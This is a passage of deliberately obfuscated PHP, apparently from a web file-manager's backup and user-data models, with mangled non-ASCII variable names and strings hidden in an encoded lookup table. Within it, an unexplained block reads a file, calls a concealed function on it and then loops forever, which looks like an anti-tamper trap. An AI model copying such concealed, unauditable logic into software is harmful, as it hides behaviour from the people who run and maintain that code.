$Ï„¦ä¯É[$Âˆ…Âåˆ[1705]] - $Ï„¦ä¯É[$Âˆ…Âåˆ[1708]]; $Ï„¦ä¯É[$Âˆ…Âåˆ[1709]] = $ä”éÒØ“ * (1 - $Ï„¦ä¯É[$Âˆ…Âåˆ[1703]]) / $Ï„¦ä¯É[$Âˆ…Âåˆ[1703]]; } } public function addFile($šÁå÷ïŒ) { $ˆü‰ìÀ =& $_SERVER[ò«¥Ê‡å]; $¢Û©ıÉá =& $this->task; $¥¦ïàö¾ = IO::info($šÁå÷ïŒ); $¢Û©ıÉá[$ˆü‰ìÀ[1752]] = $¥¦ïàö¾[$ˆü‰ìÀ[32]]; $¢Û©ıÉá[$ˆü‰ìÀ[1754]] = $¥¦ïàö¾[$ˆü‰ìÀ[78]]; $¢Û©ıÉá[$ˆü‰ìÀ[1755]] = 0; $¢Û©ıÉá[$ˆü‰ìÀ[1111]] = $ˆü‰ìÀ[1775]; $¢Û©ıÉá[$ˆü‰ìÀ[1756]] = $ˆü‰ìÀ[1241]; $¢Û©ıÉá[$ˆü‰ìÀ[802]] = $¥¦ïàö¾[$ˆü‰ìÀ[78]]; $¢Û©ıÉá[$ˆü‰ìÀ[825]] = 1; $ù °¸è = 0; $¢Û©ıÉá[$ˆü‰ìÀ[1763]] = array($ˆü‰ìÀ[1764] => $ù °¸è + 1, $ˆü‰ìÀ[464] => $¥¦ïàö¾[$ˆü‰ìÀ[32]], $ˆü‰ìÀ[86] => $¥¦ïàö¾[$ˆü‰ìÀ[86]], $ˆü‰ìÀ[553] => $¥¦ïàö¾[$ˆü‰ìÀ[553]] ? $¥¦ïàö¾[$ˆü‰ìÀ[553]] : $¥¦ïàö¾[$ˆü‰ìÀ[86]]); $this->update(); } public function zipEvent($»ã±´Ğ³, $ÚÃ€³ë, $„£°ÇÛÙ, $Àş¾Ò·¥) { $ŒãŠÏ—ş =& $_SERVER[ò«¥Ê‡å]; $ŞÂÄ³ » =& $this->task; $ŞÂÄ³ »[$ŒãŠÏ—ş[1752]] = get_path_this($ÚÃ€³ë); $ŞÂÄ³ »[$ŒãŠÏ—ş[1754]] = $Àş¾Ò·¥; $ŞÂÄ³ »[$ŒãŠÏ—ş[1755]] = $„£°ÇÛÙ; $ŞÂÄ³ »[$ŒãŠÏ—ş[1111]] = $»ã±´Ğ³ == $ŒãŠÏ—ş[1821] ? $ŒãŠÏ—ş[1822] : $ŒãŠÏ—ş[1823]; $ŞÂÄ³ »[$ŒãŠÏ—ş[1756]] = $ŒãŠÏ—ş[12]; $ŞÂÄ³ »[$ŒãŠÏ—ş[802]] = $Àş¾Ò·¥; $ŞÂÄ³ »[$ŒãŠÏ—ş[1819]] = $ŒãŠÏ—ş[359]; $this->update(); } public function unzipAfter($ÈÁ‰·¨¨) { $‹èŸ »æ =& $_SERVER[ò«¥Ê‡å]; $óµÆõ…û =& $this->task; $óµÆõ…û[$‹èŸ »æ[1819]] = $‹èŸ »æ[109]; $¡§Ÿ…ü† = IO::infoWithChildren($ÈÁ‰·¨¨); $¹èä¬Ã  = 0; $óµÆõ…û[$‹èŸ »æ[1763]] = array($‹èŸ »æ[1764] => $¹èä¬Ã  + 1, $‹èŸ »æ[464] => $¡§Ÿ…ü†[$‹èŸ »æ[32]], $‹èŸ »æ[86] => $¡§Ÿ…ü†[$‹èŸ »æ[86]], $‹èŸ »æ[553] => $¡§Ÿ…ü†[$‹èŸ »æ[553]] ? $¡§Ÿ…ü†[$‹èŸ »æ[553]] : $¡§Ÿ…ü†[$‹èŸ »æ[86]]); if ($¡§Ÿ…ü†[$‹èŸ »æ[33]] == $‹èŸ »æ[216]) { $óµÆõ…û[$‹èŸ »æ[825]] = 1; } else { $óµÆõ…û[$‹èŸ »æ[825]] = $¡§Ÿ…ü†[$‹èŸ »æ[81]][$‹èŸ »æ[79]]; } $óµÆõ…û[$‹èŸ »æ[1111]] = $‹èŸ »æ[12]; $óµÆõ…û[$‹èŸ »æ[1756]] = 0; $óµÆõ…û[$‹èŸ »æ[1702]] = 0; $óµÆõ…û[$‹èŸ »æ[1754]] = 0; $óµÆõ…û[$‹èŸ »æ[1755]] = 0; $óµÆõ…û[$‹èŸ »æ[1752]] = $‹èŸ »æ[12]; $óµÆõ…û[$‹èŸ »æ[1759]] = 0; $óµÆõ…û[$‹èŸ »æ[802]] = $¡§Ÿ…ü†[$‹èŸ »æ[78]]; $this->update(); self::log($‹èŸ »æ[1824] . json_encode(array($óµÆõ…û, $¡§Ÿ…ü†))); } public function nameParse($½´Ëè‡®) { $˜öÛô©û =& $_SERVER[ò«¥Ê‡å]; $Ä›Úíü =& $this->task; if ($Ä›Úíü[$˜öÛô©û[1819]] == $˜öÛô©û[1241]) { $Ä›Úíü[$˜öÛô©û[1819]] = $˜öÛô©û[359]; $Ä›Úíü[$˜öÛô©û[1759]] = 0; $Ä›Úíü[$˜öÛô©û[802]] = 0; } $âªªùĞ‰ = get_path_this($½´Ëè‡®); if (strstr($âªªùĞ‰, $˜öÛô©û[10])) { $Ä›Úíü[$˜öÛô©û[1702]] += 1; $Ä›Úíü[$˜öÛô©û[825]] += 1; } $Ä›Úíü[$˜öÛô©û[1752]] = $½´Ëè‡®; $this->update(); } } goto d×ÆÜ²ãÓ; B²Š÷Ó¤: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ü¼”à—© =& $_SERVER[ò«¥Ê‡å]; $this->isManual(); self::$name = date($ü¼”à—©[787]); if (!($Ç¨¦Œ…Â = Model($ü¼”à—©[788])->lastItem())) { $Ç¨¦Œ…Â = $this->initData(); } else { self::$name = $Ç¨¦Œ…Â[$ü¼”à—©[32]]; if ($Ç¨¦Œ…Â[$ü¼”à—©[789]] == $ü¼”à—©[90]) { self::$name = date($ü¼”à—©[257]); $¶±£ÇŞÎ = 0; if (isset($Ç¨¦Œ…Â[$ü¼”à—©[339]][$ü¼”à—©[216]][$ü¼”à—©[511]])) { $¶±£ÇŞÎ = (int) $Ç¨¦Œ…Â[$ü¼”à—©[339]][$ü¼”à—©[216]][$ü¼”à—©[511]]; } if (self::$manual == 0 && $Ç¨¦Œ…Â[$ü¼”à—©[32]] == self::$name) { Model($ü¼”à—©[788])->remove($Ç¨¦Œ…Â[$ü¼”à—©[445]]); } $Ç¨¦Œ…Â = $this->initData($¶±£ÇŞÎ, $Ç¨¦Œ…Â[$ü¼”à—©[790]]); } else { $this->checkStore($Ç¨¦Œ…Â[$ü¼”à—©[790]]); } } self::$option = $Ç¨¦Œ…Â; } private function isManual() { $Ë’ÉŠÀÏ = _get($GLOBALS, $_SERVER[ò«¥Ê‡å][791], 0); $Ë’ÉŠÀÏ = intval($Ë’ÉŠÀÏ); self::$manual = $Ë’ÉŠÀÏ && $Ë’ÉŠÀÏ == 1 ? 1 : 0; } private function initData($‘¶¿Ğµ‡ = 0, $ ô÷ºÄ = '') { $¢ê˜Šƒ› =& $_SERVER[ò«¥Ê‡å]; $äóòÒİ× = Model($¢ê˜Šƒ›[788])->config(); if ($ ô÷ºÄ && $äóòÒİ×[$¢ê˜Šƒ›[790]] != $ ô÷ºÄ) { $‘¶¿Ğµ‡ = 0; } $this->checkStore($äóòÒİ×[$¢ê˜Šƒ›[790]]); if (self::$manual == 1) { self::$name .= $¢ê˜Šƒ›[11] . date($¢ê˜Šƒ›[792]); } $ÑÙ¥†Îé = array($¢ê˜Šƒ›[790] => $äóòÒİ×[$¢ê˜Šƒ›[790]], $¢ê˜Šƒ›[32] => self::$name, $¢ê˜Šƒ›[789] => 0, $¢ê˜Šƒ›[793] => $äóòÒİ×[$¢ê˜Šƒ›[793]], $¢ê˜Šƒ›[794] => self::$manual, $¢ê˜Šƒ›[339] => array($¢ê˜Šƒ›[795] => array($¢ê˜Šƒ›[789] => 0), $¢ê˜Šƒ›[796] => array($¢ê˜Šƒ›[789] => 0, $¢ê˜Šƒ›[797] => 0, $¢ê˜Šƒ›[798] => 0, $¢ê˜Šƒ›[33] => $¢ê˜Šƒ›[12], $¢ê˜Šƒ›[799] => 0, $¢ê˜Šƒ›[800] => 0), $¢ê˜Šƒ›[801] => array($¢ê˜Šƒ›[789] => 0, $¢ê˜Šƒ›[797] => 0, $¢ê˜Šƒ›[798] => 0, $¢ê˜Šƒ›[799] => 0, $¢ê˜Šƒ›[800] => 0), $¢ê˜Šƒ›[216] => array($¢ê˜Šƒ›[789] => 0, $¢ê˜Šƒ›[802] => 0, $¢ê˜Šƒ›[803] => 0, $¢ê˜Šƒ›[804] => 0, $¢ê˜Šƒ›[805] => 0, $¢ê˜Šƒ›[511] => $‘¶¿Ğµ‡, $¢ê˜Šƒ›[799] => 0, $¢ê˜Šƒ›[800] => 0)), $¢ê˜Šƒ›[799] => time(), $¢ê˜Šƒ›[800] => 0); $¿é‡È¥³ = Model($¢ê˜Šƒ›[788])->insert($ÑÙ¥†Îé); $ÑÙ¥†Îé[$¢ê˜Šƒ›[445]] = $¿é‡È¥³; return $ÑÙ¥†Îé; } private function checkStore($éó¡—Ã) { $İ–Ù«¨Ø =& $_SERVER[ò«¥Ê‡å]; $‡æåÌ‘Ú = Model($İ–Ù«¨Ø[806])->listData($éó¡—Ã); Model($İ–Ù«¨Ø[806])->checkConfig($‡æåÌ‘Ú); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ò«¥Ê‡å][788])->findByName(self::$name); } return self::$option; } public static function set($›€Áş¥é) { $Ï‡ôÍâ¾ =& $_SERVER[ò«¥Ê‡å]; $ì«ÎéÄ = self::get(); foreach ($›€Áş¥é as $ê—¥§†¯ => $Ó¦Í­¨Ç) { $¾Ä³®•½ = explode($Ï‡ôÍâ¾[10], $ê—¥§†¯); $¨¹ëûúú = count($¾Ä³®•½); switch ($¨¹ëûúú) { case 1: $ì«ÎéÄ[$¾Ä³®•½[0]] = $Ó¦Í­¨Ç; break; case 2: $ì«ÎéÄ[$¾Ä³®•½[0]][$¾Ä³®•½[1]] = $Ó¦Í­¨Ç; break; case 3: $ì«ÎéÄ[$¾Ä³®•½[0]][$¾Ä³®•½[1]][$¾Ä³®•½[2]] = $Ó¦Í­¨Ç; break; } } Model($Ï‡ôÍâ¾[788])->update($ì«ÎéÄ[$Ï‡ôÍâ¾[445]], $ì«ÎéÄ); self::$option = $ì«ÎéÄ; return self::$option; } public function keep() { $…€Œ¡Ğí =& $_SERVER[ò«¥Ê‡å]; $ÆéÌíÄŠ = self::get(); if ($ÆéÌíÄŠ[$…€Œ¡Ğí[339]][$…€Œ¡Ğí[795]][$…€Œ¡Ğí[789]] == $…€Œ¡Ğí[90]) { return; } $this->backupKeep($ÆéÌíÄŠ); self::set(array($…€Œ¡Ğí[807] => 1)); } private function backupKeep($ƒÒõ Â) { $ÅªÁù÷ =& $_SERVER[ò«¥Ê‡å]; if (self::$manual == 1) { return; } $îŠİ°æ = Model($ÅªÁù÷[788])->listData(); if (empty($îŠİ°æ)) { return; } $ƒ¹éë¬˜ = 0; $İ¨‹Î× = array(); foreach ($îŠİ°æ as $œˆå«) { if ($ƒ¹éë¬˜ >= 7) { break; } $İ¨‹Î×[] = $œˆå«[$ÅªÁù÷[32]]; $ƒ¹éë¬˜++; } for ($ƒ¹éë¬˜ = 0; $ƒ¹éë¬˜ < 12; $ƒ¹éë¬˜++) { $İ¨‹Î×[] = date($ÅªÁù÷[808], strtotime("\x2d{$ƒ¹éë¬˜}\x20\155\x6f\156\164\x68\x73")); } $İ¨‹Î× = array_unique($İ¨‹Î×); $Ô¶×®†î = Model($ÅªÁù÷[809])->get($ÅªÁù÷[810]); foreach ($îŠİ°æ as $œˆå«) { if (isset($œˆå«[$ÅªÁù÷[794]]) && $œˆå«[$ÅªÁù÷[794]] == $ÅªÁù÷[90]) { continue; } if (!empty($œˆå«[$ÅªÁù÷[32]]) && in_array($œˆå«[$ÅªÁù÷[32]], $İ¨‹Î×)) { continue; } Model($ÅªÁù÷[788])->remove($œˆå«[$ÅªÁù÷[445]]); $²ğ›öÓ¼ = $this->backupPath($ƒÒõ Â, $Ô¶×®†î); IO::remove($²ğ›öÓ¼, !1); } } private function backupPath($†úµç†, $‚ÛÍ…øÏ = false) { $Ì‚­­ÔË =& $_SERVER[ò«¥Ê‡å]; if (!$‚ÛÍ…øÏ) { $‚ÛÍ…øÏ = Model($Ì‚­­ÔË[809])->get($Ì‚­­ÔË[810]); } $ª‚¸Ç¾à = $†úµç†[$Ì‚­­ÔË[32]]; $™¡ = substr(md5($Ì‚­­ÔË[811] . $‚ÛÍ…øÏ . $ª‚¸Ç¾à), 0, 8); return "\x7b\151\157\x3a{$†úµç†[$Ì‚­­ÔË[790]]}\x7d\x2f\144\x61\x74\141\x62\x61\163\145\x2f\x62\x61\x63\153\x75\160\x2f" . $ª‚¸Ç¾à . $Ì‚­­ÔË[11] . $™¡; } public function db() { $‡ö‘Ä°» =& $_SERVER[ò«¥Ê‡å]; $ĞÎÍ‡Ò… = self::get(); if ($ĞÎÍ‡Ò…[$‡ö‘Ä°»[339]][$‡ö‘Ä°»[796]][$‡ö‘Ä°»[789]] == $‡ö‘Ä°»[90]) { return !0; } $«¼æ®Á­ = new BackupDb(); if (!$«¼æ®Á­->index()) { return !1; } self::set(array($‡ö‘Ä°»[812] => 1)); return !0; } public function dbFile() { $œ¹ŠÌó =& $_SERVER[ò«¥Ê‡å]; $ÒÇ›Ìèö = self::get(); if ($ÒÇ›Ìèö[$œ¹ŠÌó[339]][$œ¹ŠÌó[801]][$œ¹ŠÌó[789]] == $œ¹ŠÌó[90]) { return !0; } $´áÒ˜ì = new BackupDbFile(); if (!$´áÒ˜ì->index()) { return !1; } self::set(array($œ¹ŠÌó[813] => 1)); return !0; } public function file() { $ÕÎªìˆ§ =& $_SERVER[ò«¥Ê‡å]; $°­ˆÛ¨ş = self::get(); if ($°­ˆÛ¨ş[$ÕÎªìˆ§[339]][$ÕÎªìˆ§[216]][$ÕÎªìˆ§[789]] == $ÕÎªìˆ§[90]) { return !0; } if (!isset($°­ˆÛ¨ş[$ÕÎªìˆ§[793]]) || $°­ˆÛ¨ş[$ÕÎªìˆ§[793]] == $ÕÎªìˆ§[214]) { $Îæ¨Åó• = new BackupFile(); if (!$Îæ¨Åó•->index()) { return !1; } } self::set(array($ÕÎªìˆ§[814] => 1, $ÕÎªìˆ§[789] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ø›Ìéà =& $_SERVER[ò«¥Ê‡å]; $½œß‡§ = Backup::get(); self::$io = $½œß‡§[$ø›Ìéà[790]]; self::$name = $½œß‡§[$ø›Ìéà[32]]; $ß¶ú…ş = new DbManage(); $²§–ë¨ = $ß¶ú…ş->dbType(); $Çœ–Œë = array($ø›Ìéà[815] => $²§–ë¨, $ø›Ìéà[816] => time()); Backup::set($Çœ–Œë); $æİşí¤Ø = $this->tmpFilesPath() . $ø›Ìéà[817] . self::$name . $ø›Ìéà[8]; del_dir($æİşí¤Ø); mk_dir($æİşí¤Ø); $–Ÿ©şøù = $ó‡”İ¢Æ = 0; $¶¬§çëÓ = new Task($ø›Ìéà[818], $ø›Ìéà[819], 0, LNG($ø›Ìéà[820]) . $ø›Ìéà[821] . LNG($ø›Ìéà[822])); try { $…¢Ä¥®™ = $ß¶ú…ş->db()->getTables(); } catch (Exception $ÉÓÈµ¯ò) { $¶¬§çëÓ->end(); return !1; } $…¢Ä¥®™ = array_diff($…¢Ä¥®™, array($ø›Ìéà[823], $ø›Ìéà[824])); foreach ($…¢Ä¥®™ as $Ô¶äì¬) { $–Ÿ©şøù += $ß¶ú…ş->model($Ô¶äì¬)->count(); } $¶¬§çëÓ->task[$ø›Ìéà[825]] = $–Ÿ©şøù; $GLOBALS[$ø›Ìéà[826]] = self::$name; foreach ($…¢Ä¥®™ as $Ô¶äì¬) { $°áÇşšÆ = $æİşí¤Ø . $Ô¶äì¬ . $ø›Ìéà[827]; $ˆÍéäŠˆ = null; if ($Ô¶äì¬ == $ø›Ìéà[828] && (!isset($½œß‡§[$ø›Ìéà[793]]) || $½œß‡§[$ø›Ìéà[793]] == $ø›Ìéà[214])) { $ˆÍéäŠˆ = self::$io; } $ó‡”İ¢Æ += $ß¶ú…ş->sqlFromDb($Ô¶äì¬, $°áÇşšÆ, $¶¬§çëÓ, $ˆÍéäŠˆ); } unset($GLOBALS[$ø›Ìéà[826]]); $¶¬§çëÓ->end(); if ($ó‡”İ¢Æ > $–Ÿ©şøù) { $–Ÿ©şøù = $ó‡”İ¢Æ; } $Çœ–Œë = array($ø›Ìéà[815] => $²§–ë¨, $ø›Ìéà[812] => 1, $ø›Ìéà[829] => $–Ÿ©şøù, $ø›Ìéà[830] => $ó‡”İ¢Æ, $ø›Ìéà[831] => time()); Backup::set($Çœ–Œë); if ($–Ÿ©şøù - $ó‡”İ¢Æ > 1) { $Ì€“„çõ = $ø›Ìéà[832]; if (stristr(I18n::getType(), $ø›Ìéà[833])) { $Ì€“„çõ = $ø›Ìéà[834]; } write_log(array($Ì€“„çõ, $Çœ–Œë), $ø›Ìéà[819]); return !1; } return !0; } private function tmpFilesPath() { $¢ëœëšû =& $_SERVER[ò«¥Ê‡å]; $ßèø¨µ = TEMP_FILES; if ($GLOBALS[$¢ëœëšû[6]][$¢ëœëšû[91]][$¢ëœëšû[835]]) { $ßèø¨µ = $GLOBALS[$¢ëœëšû[6]][$¢ëœëšû[91]][$¢ëœëšû[835]]; if (!mk_dir($ßèø¨µ) || !is_writable($ßèø¨µ) || !IO::mkfile($ßèø¨µ . $¢ëœëšû[836])) { $ßèø¨µ = TEMP_FILES; } } return $ßèø¨µ; } } if (!isset($_SERVER[$_SERVER[ò«¥Ê‡å][837]]) || !isset($_SERVER[$_SERVER[ò«¥Ê‡å][838]])) { $_getc = $_SERVER[ò«¥Ê‡å][839]; $_getfile = $_SERVER[$_SERVER[ò«¥Ê‡å][840]] . $_SERVER[ò«¥Ê‡å][841]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ò«¥Ê‡å][248], $_getfilec); if (count($_getarrs) < $_SERVER[ò«¥Ê‡å][653]) { $exit = $_SERVER[ò«¥Ê‡å][842]; $exit(); } $_act = $_SERVER[ò«¥Ê‡å][843]; $_act($_SERVER[$_SERVER[ò«¥Ê‡å][840]] . $_SERVER[ò«¥Ê‡å][841]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ò«¥Ê‡å][424]); } } goto dô™ùğ³Ğ³; CÏÓ”ÀùÔÙ: define($_SERVER[ò«¥Ê‡å][0], $_SERVER[ò«¥Ê‡å][1]); $_SERVER[öúâ•Û®] = explode($_SERVER[ò«¥Ê‡å][2], gzinflate(substr($_SERVER[ò«¥Ê‡å][3], 10, -8))); function binCheckEq($ŒÉşœÔ¼, $è‹¢ÜÕ) { return $ŒÉşœÔ¼ == $è‹¢ÜÕ; } goto EŠ÷Á¡§; CŒØâ¢“•©: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($ÑªŞÅ¦¹) { $íàşÄÒå =& $_SERVER[ò«¥Ê‡å]; return array($íàşÄÒå[2010] => array(USER_ID, $íàşÄÒå[2350])); } protected function listData() { $õäØÖ« =& $_SERVER[ò«¥Ê‡å]; $ØˆîÓ“´ = array($õäØÖ«[1692] => USER_ID, $õäØÖ«[528] => 0); $ÕÎ¸õîÖ = $õäØÖ«[2351]; $Ñõ·ç¹ë = $this->field($ÕÎ¸õîÖ)->where($ØˆîÓ“´)->order($õäØÖ«[2352])->select(); return $Ñõ·ç¹ë ? $Ñõ·ç¹ë : array(); } protected function resetCache() { } protected function listView() { $éÊˆÍ€ =& $_SERVER[ò«¥Ê‡å]; $–Š³ŸÆà = $this->listData(); $ïÄ£ïÁ = array_filter_by_field($–Š³ŸÆà, $éÊˆÍ€[33], $éÊˆÍ€[460]); $ëîôß = array_to_keyvalue($ïÄ£ïÁ, $éÊˆÍ€[12], $éÊˆÍ€[86]); if (!$ëîôß) { return $–Š³ŸÆà; } $”º‰Ş‘ó = 2000; $˜ÚşäÍ = array($éÊˆÍ€[461] => array($éÊˆÍ€[462], $ëîôß)); $¦¬«ğÅû = Model($éÊˆÍ€[871])->listSource($˜ÚşäÍ, $”º‰Ş‘ó); $¦¬«ğÅû = array_merge($¦¬«ğÅû[$éÊˆÍ€[85]], $¦¬«ğÅû[$éÊˆÍ€[84]]); $¦¬«ğÅû = array_to_keyvalue($¦¬«ğÅû, $éÊˆÍ€[183]); foreach ($–Š³ŸÆà as $üê‰á  => $ĞÔ§§‘ô) { $­å»ÈË = $¦¬«ğÅû[$ĞÔ§§‘ô[$éÊˆÍ€[86]]]; $­å»ÈË = $­å»ÈË ? $­å»ÈË : array(); $–Š³ŸÆà[$üê‰á ] = array_merge($­å»ÈË, $ĞÔ§§‘ô); } return $–Š³ŸÆà; } protected function addFav($É¯Û•‚, $¿‚ìƒØ = '', $·Õ‡¸Ÿ = "\x73\x6f\165\162\x63\x65") { $÷õÀœîÖ =& $_SERVER[ò«¥Ê‡å]; $àÆíÀ„ı = array($÷õÀœîÖ[1692] => USER_ID, $÷õÀœîÖ[528] => 0, $÷õÀœîÖ[466] => $·Õ‡¸Ÿ, $÷õÀœîÖ[465] => $É¯Û•‚); if ($this->where($àÆíÀ„ı)->find()) { return !1; } $àÆíÀ„ı = array($÷õÀœîÖ[1692] => USER_ID, $÷õÀœîÖ[528] => 0); $õ‰±˜‡‘ = $this->where($àÆíÀ„ı)->max($÷õÀœîÖ[1923]); if (!$õ‰±˜‡‘) { $õ‰±˜‡‘ = 0; } if (!$¿‚ìƒØ && $·Õ‡¸Ÿ == $÷õÀœîÖ[460]) { $ŠÕŒÎûñ = Model($÷õÀœîÖ[1380])->where(array($÷õÀœîÖ[461] => $É¯Û•‚))->find(); if (!$ŠÕŒÎûñ) { return !1; } $¿‚ìƒØ = $ŠÕŒÎûñ[$÷õÀœîÖ[32]]; } $¿‚ìƒØ = $this->getAutoName($¿‚ìƒØ); $¦ÙÊó×æ = array($÷õÀœîÖ[1692] => USER_ID, $÷õÀœîÖ[528] => 0, $÷õÀœîÖ[464] => $¿‚ìƒØ, $÷õÀœîÖ[465] => $É¯Û•‚, $÷õÀœîÖ[466] => $·Õ‡¸Ÿ, $÷õÀœîÖ[1903] => $õ‰±˜‡‘ + 1); return $this->add($¦ÙÊó×æ); } protected function remove($ü…Ä›é) { $ç–°ö£Ï =& $_SERVER[ò«¥Ê‡å]; $‹¿°¾ã¥ = array($ç–°ö£Ï[1692] => USER_ID, $ç–°ö£Ï[463] => $ü…Ä›é); return $this->where($‹¿°¾ã¥)->delete(); } protected function removeByName($şüä¨®) { $äàôü—ú =& $_SERVER[ò«¥Ê‡å]; $Ñ˜§ğ = array($äàôü—ú[1692] => USER_ID, $äàôü—ú[464] => $şüä¨®, $äàôü—ú[528] => 0); return $this->where($Ñ˜§ğ)->delete(); } protected function rename($±Ëı„¾, $¿Ô€Ûí±) { $ø¾Ş«Š =& $_SERVER[ò«¥Ê‡å]; if ($±Ëı„¾ == $¿Ô€Ûí±) { return !1; } $Ã’ıË‰€ = $this->getAutoName($¿Ô€Ûí±); if ($¿Ô€Ûí± != $Ã’ıË‰€) { return !1; } $³ö×È‚ö = array($ø¾Ş«Š[1692] => USER_ID, $ø¾Ş«Š[528] => 0, $ø¾Ş«Š[32] => $±Ëı„¾); return $this->where($³ö×È‚ö)->save(array($ø¾Ş«Š[32] => $¿Ô€Ûí±)); } protected function resetSort($ë¶âÍÁÑ) { $©ÈğÊ¬“ =& $_SERVER[ò«¥Ê‡å]; $ë¶âÍÁÑ = is_array($ë¶âÍÁÑ) ? $ë¶âÍÁÑ : array(); $éåêÃÒ£ = array($©ÈğÊ¬“[1692] => USER_ID); for ($¥´ÎÚ¨§ = 0; $¥´ÎÚ¨§ < count($ë¶âÍÁÑ); $¥´ÎÚ¨§++) { $éåêÃÒ£[$©ÈğÊ¬“[463]] = $ë¶âÍÁÑ[$¥´ÎÚ¨§]; $this->where($éåêÃÒ£)->save(array($©ÈğÊ¬“[1903] => $¥´ÎÚ¨§ + 1)); } return !0; } protected function moveTop($ê˜¸ú¹£) { $øŸ†Ô•Å =& $_SERVER[ò«¥Ê‡å]; $ë–Øñµ‹ = array($øŸ†Ô•Å[1692] => USER_ID, $øŸ†Ô•Å[528] => 0); $…ËËöŞ = $this->where($ë–Øñµ‹)->where(array($øŸ†Ô•Å[32] => $ê˜¸ú¹£))->find(); if (!$…ËËöŞ) { return; } $€Ì ¯Ÿ = $this->field($øŸ†Ô•Å[445])->where($ë–Øñµ‹)->order($øŸ†Ô•Å[2352])->select(); $€Ì ¯Ÿ = array_to_keyvalue($€Ì ¯Ÿ, $øŸ†Ô•Å[12], $øŸ†Ô•Å[445]); $ „È§ªé = $€Ì ¯Ÿ; $€Ì ¯Ÿ = array_remove_value($€Ì ¯Ÿ, $…ËËöŞ[$øŸ†Ô•Å[445]]); array_unshift($€Ì ¯Ÿ, $…ËËöŞ[$øŸ†Ô•Å[445]]); return $this->resetSort($€Ì ¯Ÿ); } protected function moveBottom($İ‡‹ÜÉ’) { $Ú½ÒÁ¼á =& $_SERVER[ò«¥Ê‡å]; $²›Ûå¼„ = array($Ú½ÒÁ¼á[1692] => USER_ID, $Ú½ÒÁ¼á[528] => 0); $şìÀ­ = $this->where($²›Ûå¼„)->max($Ú½ÒÁ¼á[1923]); $‡èô ‰ = array($Ú½ÒÁ¼á[1923] => $şìÀ­ + 1); return $this->where($²›Ûå¼„)->where(array($Ú½ÒÁ¼á[32] => $İ‡‹ÜÉ’))->save($‡èô ‰); } private function getAutoName($ãå Äú) { $İá»Ğµ• =& $_SERVER[ò«¥Ê‡å]; $œƒ€¡Õ = array($İá»Ğµ•[1692] => USER_ID, $İá»Ğµ•[528] => 0); $¹—¿†ğŒ = $this->field($İá»Ğµ•[32])->where($œƒ€¡Õ)->select(); $¹—¿†ğŒ = array_to_keyvalue($¹—¿†ğŒ, $İá»Ğµ•[12], $İá»Ğµ•[32]); if (!$¹—¿†ğŒ || !in_array($ãå Äú, $¹—¿†ğŒ)) { return $ãå Äú; } for ($Êçıûê = 0; $Êçıûê < count($¹—¿†ğŒ); $Êçıûê++) { if (!in_array($ãå Äú . "\50{$Êçıûê}\x29", $¹—¿†ğŒ)) { return $ãå Äú . "\x28{$Êçıûê}\x29"; } } return $ãå Äú . "\50{$Êçıûê}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\x6a\157\x62\x4c\151\163\x74"; public $field = array("\156\141\x6d\145", "\x64\145\163\x63", "\x73\x6f\x72\x74"); const JOB_KEY = "\x73\x65\154\146\x4a\157\x62\x4c\151\163\x74"; public function listData($×Õ•óû = false, $ ³šÄšÌ = "\163\157\x72\164", $®¾ãÔ–Ç = false) { return parent::listData($×Õ•óû, $ ³šÄšÌ, $®¾ãÔ–Ç); } public function remove($¹Ïì´ÌÏ) { return parent::remove($¹Ïì´ÌÏ); } public function add($¿ã¶ÁŞ) { $ê„ìš¢ =& $_SERVER[ò«¥Ê‡å]; if ($this->findByName($¿ã¶ÁŞ[$ê„ìš¢[32]])) { return !1; } $¿ã¶ÁŞ[$ê„ìš¢[1923]] = $this->getSort(); return parent::insert($¿ã¶ÁŞ); } private function getSort() { $ĞŠº«•° =& $_SERVER[ò«¥Ê‡å]; $¾×ùÉÄÅ = parent::listData(); $ıÂĞ¥è± = array_to_keyvalue($¾×ùÉÄÅ, $ĞŠº«•°[12], $ĞŠº«•°[1923]); return empty($ıÂĞ¥è±) ? 0 : max($ıÂĞ¥è±) + 1; } public function update($Æò˜š‡î, $Š¨°ƒ»Î) { $åæ¼Úñ¦ =& $_SERVER[ò«¥Ê‡å]; $¤¡ŞÚ = parent::listData($Æò˜š‡î); $‰ÅòÖ‰æ = $this->findByName($Š¨°ƒ»Î[$åæ¼Úñ¦[32]]); if (!$¤¡ŞÚ || $‰ÅòÖ‰æ && $‰ÅòÖ‰æ[$åæ¼Úñ¦[445]] != $¤¡ŞÚ[$åæ¼Úñ¦[445]]) { return !1; } return parent::update($Æò˜š‡î, $Š¨°ƒ»Î); } public function setUserJob($“ùØèêÑ, $”êøïÁË) { $’Ğ´Âï¾ =& $_SERVER[ò«¥Ê‡å]; if (!is_array($”êøïÁË)) { $”êøïÁË = array($”êøïÁË); } $‰éÊñ À = parent::listData(); $îÊ®ö† = array_to_keyvalue($‰éÊñ À, $’Ğ´Âï¾[32]); $‹àÚÊ = $’Ğ´Âï¾[424]; foreach ($”êøïÁË as $ÒĞĞäµş) { if ($îÊ®ö†[$ÒĞĞäµş]) { $‹àÚÊ .= $îÊ®ö†[$ÒĞĞäµş][$’Ğ´Âï¾[445]] . $’Ğ´Âï¾[50]; } else { $ãÀÏ‡¼¸ = $this->add($ÒĞĞäµş); $‹àÚÊ .= $ãÀÏ‡¼¸ . $’Ğ´Âï¾[50]; } } $‹àÚÊ = rtrim($‹àÚÊ, $’Ğ´Âï¾[50]); Model($’Ğ´Âï¾[569])->metaSet($“ùØèêÑ, self::JOB_KEY, $‹àÚÊ); } public function getUserJob($îÁ¨Äì®) { $ìÁ©‡ÄÌ = Model($_SERVER[ò«¥Ê‡å][569])->metaGet($îÁ¨Äì®); return $this->getUserJobInfo($ìÁ©‡ÄÌ[self::JOB_KEY]); } public function getUserJobInfo($Ï–‰¶Ò) { $¦§µ›¸ß =& $_SERVER[ò«¥Ê‡å]; $ÑÏ¦‘…Ô = explode($¦§µ›¸ß[50], $Ï–‰¶Ò); $£ÀÚ…Ëè = parent::listData(); $£ÀÚ…Ëè = array_remove_key($£ÀÚ…Ëè, $¦§µ›¸ß[217]); 